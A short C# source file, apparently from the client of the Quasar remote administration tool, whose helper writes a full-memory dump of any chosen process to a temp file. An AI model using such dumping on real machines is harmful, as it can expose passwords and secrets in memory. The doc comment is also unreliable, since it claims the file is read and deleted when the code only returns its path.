using Quasar.Client.Utilities;
using System;
using System.IO;
using System.Diagnostics;

namespace Quasar.Client.Helper
{
    public static class DumpHelper
    {
        /// <summary>
        /// Dumps a processes memory to a temporary file, then reads the bytes and deletes the file.
        /// </summary>
        /// <param name="pid">Process id of the process to dump</param>
        /// <param name="type">What kind of memory dump to do</param>
        /// <returns></returns>
        public static (string, bool) GetProcessDump(int pid, NativeMethods.MiniDumpType type = NativeMethods.MiniDumpType.MiniDumpWithFullMemory)
        {
            Process process = Process.GetProcessById(pid);
            string tmpFile = Path.GetTempFileName();
            try
            {
                bool success = false;
                using (FileStream fs = new FileStream(tmpFile, FileMode.Create, FileAccess.Write, FileShare.None))
                {
                    success = NativeMethods.MiniDumpWriteDump(
                        process.Handle,
                        process.Id,
                        fs.SafeFileHandle.DangerousGetHandle(),
                        type,
                        IntPtr.Zero,
                        IntPtr.Zero,
                        IntPtr.Zero);
                }
                if (success)
                {
                    return (tmpFile, true);
                }
            }
            catch (Exception ex)
            {
                return (ex.ToString(), false);
            }
            return ("", false);
        }
    }
}
